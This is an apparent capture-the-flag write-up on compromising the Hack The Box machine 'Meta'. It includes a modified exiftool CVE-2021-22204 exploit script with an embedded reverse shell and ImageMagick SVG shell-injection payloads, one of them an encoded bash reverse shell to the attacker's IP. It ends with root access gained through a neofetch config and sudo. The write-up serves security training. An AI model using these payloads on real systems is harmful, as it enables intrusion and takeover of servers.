## Default Information
IP Address: 10.10.11.140\
OS: Linux

## Discovery

Before we start, let's first add the IP address and the host to our ```/etc/hosts``` file.

```
10.10.11.140    meta.htb
```
### Masscan
Firstly, we will use masscan to identify the open ports

```
┌──(kali㉿kali)-[~]
└─$ sudo masscan -p1-65535,U:1-65535 10.10.11.140 --rate=1000 -e tun0
Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2022-03-31 11:19:55 GMT
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 22/tcp on 10.10.11.140                                    
Discovered open port 80/tcp on 10.10.11.140   
```

### Nmap
We will then use the open ports obtained from masscan to run a scan using nmap to enumerate the services operating behind each port

| Port Number | Service | Version | State |
|-----|------------------|----------------------|----------------------|
| 22  | SSH | OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) | Open |
| 80  | HTTP | Apache httpd | Open |

From the nmap output, we can see that visiting http://meta.htb will redirect us to http://artcorp.htb. However, we are currently not able to redirect to http://artcorp.htb as we have not added http://artcorp.htb to our /etc/hosts file. 

We will now add artcorp.htb to our /etc/hosts file

```
10.10.11.140    meta.htb artcorp.htb
```
### Web Enumeration
Using gobuster to enumerate the endpoints on http://meta.htb, we realize that most of the endpoints return a status code of 403, and the index.php page redirects us to http://artcorp.htb.

```
http://10.10.11.140:80/index.php            (Status: 301) [Size: 0] [--> http://artcorp.htb]
http://10.10.11.140:80/index.php            (Status: 301) [Size: 0] [--> http://artcorp.htb]
```

Next, we will try to do a Gobuster enumeration on http://artcorp.htb. However, we were still unable to obtain any meaningful endpoints

```
http://artcorp.htb/css                  (Status: 301) [Size: 231] [--> http://artcorp.htb/css/]
http://artcorp.htb/assets               (Status: 301) [Size: 234] [--> http://artcorp.htb/assets/]
http://artcorp.htb/index.html           (Status: 200) [Size: 4427]
http://artcorp.htb/server-status        (Status: 403) [Size: 199]
```

Since, we are unable to find any meaningful endpoints from the Gobuster enumeration of http://meta.htb and http://artcorp.htb, let us try to do a virtual host enumeration of http://artcorp.htb using Gobuster instead. This time round, we were able to find a new virtual host on http://artcorp.htb

```
Found: dev01.artcorp.htb (Status: 200) [Size: 247]
```

Now, we will add the subdomain of http://artcorp.htb to our /etc/hosts file

```
10.10.11.140    meta.htb artcorp.htb dev01.artcorp.htb
```
Next, we will use gobuster to enumerate the endpoints of http://dev01.artcorp.htb

```
http://dev01.artcorp.htb/index.php            (Status: 200) [Size: 247]
```

Visiting http://dev01.artcorp.htb/index.php, we are able to find a link that redirects us to http://dev01.artcorp.htb/metaview/ which shows us a webpage that allows images to be uploaded.

Uploading an image onto the website, we realize that the webpage displays the metadata of the image that we have uploaded.

![Metadata of uploaded image](https://github.com/joelczk/writeups/blob/main/HTB/Images/Meta/meta_upload.png)

## Exploit
### Exploiting exiftool (CVE-2021-22204)
Looking at the metadata, the first thing that comes to mind would be exiftool. We shall first try to modify the metadata of the image file that we upload and try to obtain a reverse shell.

To do that, we will use exiftool to modify the metadata such that it contains a PHP code that executes a ping command

```
┌──(kali㉿kali)-[~/Desktop/meta]
└─$ exiftool -Comment="<?php exec('ping 10.10.16.3');" test.jpg
    1 image files updated
```

Next, we will open wireshark to check for any ping commands on 10.10.16.3 and we will upload the image onto the website. Unfortunately, we are unable to get any pings on our IP address.

Researching on exiftool exploits, we are able to come across CVE-2021-22204 for exiftool. Let us try to if this CVE works on this website. We will first obtain the exploit script from [here](https://github.com/convisolabs/CVE-2021-22204-exiftool)

However, we will need to modify the exploit script to change the IP address and the port of our reverse shell.

```
#!/bin/env python3

import base64
import subprocess

ip = '10.10.16.3'
port = '4000'

payload = b"(metadata \"\c${use MIME::Base64;eval(decode_base64('"


payload = payload + base64.b64encode( f"use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));if(connect(S,sockaddr_in({port},inet_aton('{ip}')))){{open(STDIN,'>&S');open(STDOUT,'>&S');open(STDERR,'>&S');exec('/bin/sh -i');}};".encode() )

payload = payload + b"'))};\")"


payload_file = open('payload', 'w')
payload_file.write(payload.decode('utf-8'))
payload_file.close()


subprocess.run(['bzz', 'payload', 'payload.bzz'])
subprocess.run(['djvumake', 'exploit.djvu', "INFO=1,1", 'BGjp=/dev/null', 'ANTz=payload.bzz'])
subprocess.run(['exiftool', '-config', 'configfile', '-HasselbladExif<=exploit.djvu', 'image.jpg']) 
```

Next, we will run the python exploit code and this will create a malicious jpg image. Afterwards, we will upload the image onto http://dev01.artcorp.htb/metaview/index.php and we will be able to obtain a reverse shell.

![Obtaining reverse shell](https://github.com/joelczk/writeups/blob/main/HTB/Images/Meta/reverse_shell.png)

### Privilege Escalation to Thomas
We realize that the user that we are in currently is ```www-data``` and we don't have the permissions to view the user flag in /home/thomas. 

```
www-data@meta:/home/thomas$ cat /home/thomas/user.txt
cat /home/thomas/user.txt
cat: /home/thomas/user.txt: Permission denied
```

Looking at the output from linpeas script, we are able to find /etc/ImageMagick-6/mime.xml which reminds us of the infamous ImageMagick exploit. There might be some form of script running ImageMagick in the background.
```
══╣ Possible private SSH keys were found!
/etc/ImageMagick-6/mime.xml
```

Next, we will have to check the version of ImageMagick that is being used. From the output, we know that we are using ImageMagick 7.0.10

```
www-data@meta:/etc/ImageMagick-6$ convert -version
convert -version
Version: ImageMagick 7.0.10-36 Q16 x86_64 2021-08-29 https://imagemagick.org
Copyright: © 1999-2020 ImageMagick Studio LLC
License: https://imagemagick.org/script/license.php
Features: Cipher DPC HDRI OpenMP(4.5) 
Delegates (built-in): fontconfig freetype jng jpeg png x xml zlib
```

Let us upload pspy64s onto the server and execute it to check the background processes that is running in the background. From the pspy64s output, we realize that there is a convert_image bash script that is being executed in the background.

Also, we notice that the script is being executed with the permissions of UID=1000 which is the UID of thomas. This means that we can actually use this to do a privilege escalation to Thomas

```
2022/03/31 22:46:01 CMD: UID=1000 PID=10175  | /bin/sh -c /usr/local/bin/convert_images.sh 
2022/03/31 22:46:01 CMD: UID=1000 PID=10176  | /usr/local/bin/mogrify -format png *.* 
2022/03/31 22:46:01 CMD: UID=1000 PID=10177  | pkill mogrify 
```

Now, we will check what /usr/local/bin/convert_images.sh is doing. From the script, we can see that the script will convert the images in /var/www/dev01.artcorp.htb/convert_images and convert it into png image.

```
www-data@meta:/usr/local/bin$ cat convert_images.sh
cat convert_images.sh
#!/bin/bash
cd /var/www/dev01.artcorp.htb/convert_images/ && /usr/local/bin/mogrify -format png *.* 2>/dev/null
pkill mogrify
```

With some research, we know that mogrify is part of the ImageMagick suite of tools and so, mogrify should be vulnerable to the ImageMagick exploits as well. 

Let us first try to use the payload from [here](https://insert-script.blogspot.com/2020/11/imagemagick-shell-injection-via-pdf.html) to create a vulnerable svg payload and try to write the output of ```id``` to a file (NOTE: This only works for writing files to /dev/shm directory not the /tmp directory)

```
<image authenticate='ff" `echo $(id)> /dev/shm/exploit`;"'>
  <read filename="pdf:/etc/passwd"/>
  <get width="base-width" height="base-height" />
  <resize geometry="400x400" />
  <write filename="test.png" />
  <svg width="700" height="700" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">       
  <image xlink:href="msl:poc.svg" height="100" width="100"/>
  </svg>
</image>
```

Afterwards, we will upload the vulnerable svg payload to the /var/www/dev01.artcorp.htb/convert_images/ directory and the output of id will be written to the file named exploit. From the output, we can also see that we are now running the convert_images.sg script with the privileges of thomas

```
www-data@meta:/dev/shm$ cat exploit
cat exploit
uid=1000(thomas) gid=1000(thomas) groups=1000(thomas)
```

### Obtaining user flag

We will now slightly modify the payload to create a reverse shell with the privileges of thomas. 

```
<image authenticate='ff" `echo -n YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4zLzIwMDAgMD4mMQ== | base64 -d | bash > /dev/shm/exploit`;"'>
  <read filename="pdf:/etc/passwd"/>
  <get width="base-width" height="base-height" />
  <resize geometry="400x400" />
  <write filename="test.png" />
  <svg width="700" height="700" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <image xlink:href="msl:poc.svg" height="100" width="100"/>
  </svg>
</image>
```

Afterwards, we will be able to obtain the user's flag from /home/thomas/user.txt

```
thomas@meta:~$ cat user.txt
cat user.txt
<Redacted user flag>
```

### Privilege Escalation to root user
Using linpeas, we are able to obtain an id_rsa file in /home/thomas/.ssh/id_rsa. We will save the id_rsa file on our local machine and ssh in with the id_rsa file. 

```
┌──(kali㉿kali)-[~/Desktop/meta]
└─$ ssh -i id_rsa thomas@10.10.11.140                                                                          255 ⨯
Linux meta 4.19.0-17-amd64 #1 SMP Debian 4.19.194-3 (2021-07-18) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
thomas@meta:~$ 
```

Running ```sudo -l```, we realize that the user Thomas is able to execute commands on neofetch with root permissions. We can then make use of neofetch to gain privilege escalation to the root user.

```
thomas@meta:~$ sudo -l
Matching Defaults entries for thomas on meta:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    env_keep+=XDG_CONFIG_HOME

User thomas may run the following commands on meta:
    (root) NOPASSWD: /usr/bin/neofetch \"\"
```

From the output of ```sudo -l```, we also realize that there is an extra environment variable that sets the XDG_CONFIG_HOME. However, when we try to check the value of XDG_CONFIG_HOME, we realize that it is currently not set. With some research, we realize that the XDG_CONFIG_HOME is the base directory where config files are being stored.

```
thomas@meta:~$ echo $XDG_CONFIG_HOME

thomas@meta:~$ 
```

Let us first set the XDG_CONFIG_HOME using the default value of $HOME/.config.

```
thomas@meta:~$ export XDG_CONFIG_HOME="$HOME/.config"
thomas@meta:~$ echo $XDG_CONFIG_HOME
/home/thomas/.config
thomas@meta:~$ 
```

However, we also realize that /usr/bin/neofetch runs with root permissions only when the command ```/usr/bin/neofetch \"\"``` is executed. All other commands of neofetch are not executed with root permissions. As a result, we are unable to use the permission escalation methods stated in GTFOBins from [here](https://gtfobins.github.io/gtfobins/neofetch/)

Navigating to /home/thomas/.config, we realize that there is a config file for neofetch. Let us try to modify the config file for neofetch in /home/thomas/.config/neofetch/config.conf to achieve privilege escalation.

To do that, we will first have to add a reverse shell payload to /home/thomas/.config/neofetch/config.conf. However, for this payload we will have to add it to the print_info() function in the config file so that the reverse shell payload will be called when we execute the /usr/bin/neofetch command.

![Reverse shell for neofetch](https://github.com/joelczk/writeups/blob/main/HTB/Images/Meta/reverse_shell_neofetch.png)

Upon executing ```sudo /usr/bin/neofetch \"\"```, we will then obtain a reverse shell

```
root@meta:/home/thomas/.config/neofetch# id
id
uid=0(root) gid=0(root) groups=0(root)
```

### Obtaining root flag
```
root@meta:/home/thomas/.config/neofetch# cat /root/root.txt
cat /root/root.txt
<Redacted root flag>
```
## Post-Exploitation
### Using ImageMagick to write user flag to file
Another way that we can obtain the user flag is to modify the poc.svg payload such that it writes the user flag to a file in the /dev/shm directory. Since we are will be running the script with the permissions of Thomas, we will be able to write the user flag to a file

```
<image authenticate='ff" `cat /home/thomas/user.txt> /dev/shm/user_flag`;"'>
  <read filename="pdf:/etc/passwd"/>
  <get width="base-width" height="base-height" />
  <resize geometry="400x400" />
  <write filename="test.png" />
  <svg width="700" height="700" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <image xlink:href="msl:poc.svg" height="100" width="100"/>
  </svg>
</image>
```

### Alternative approach to obtain root flag
Another alternative approach to obtain the root flag is to use ```cat /root/root.txt``` instead of a reverse shell and add it to the print_info() function in the config.conf file.

```
# See this wiki page for more info:
# https://github.com/dylanaraps/neofetch/wiki/Customizing-Info
print_info() {
    cat /root/root.txt
    info title 
    info underline
```

This will then print out the root flag when we execute the ```sudo /usr/bin/neofetch \"\"``` command
```
thomas@meta:~/.config/neofetch$ sudo /usr/bin/neofetch \"\"
<Redacted root flag>
    ,g$$$$$$$$$$$$$$$P.       root@meta 
  ,g$$P"     """Y$$.".        --------- 
 ,$$P'              `$$$.     OS: Debian GNU/Linux 10 (buster) x86_64 
',$$P       ,ggs.     `$$b:   Host: VMware Virtual Platform None 
`d$$'     ,$P"'   .    $$$    Kernel: 4.19.0-17-amd64 
 $$P      d$'     ,    $$P    Uptime: 33 mins 
 $$:      $$.   -    ,d$$'    Packages: 495 (dpkg) 
 $$;      Y$b._   _,d$P'      Shell: bash 5.0.3 
 Y$$.    `.`"Y$$$$P"'         CPU: AMD EPYC 7401P 24- (2) @ 2.000GHz 
 `$$b      "-.__              GPU: VMware SVGA II Adapter 
  `Y$$                        Memory: 107MiB / 1994MiB 
   `Y$$.
     `$$b.                                            
       `Y$$b.
          `"Y$b._
```
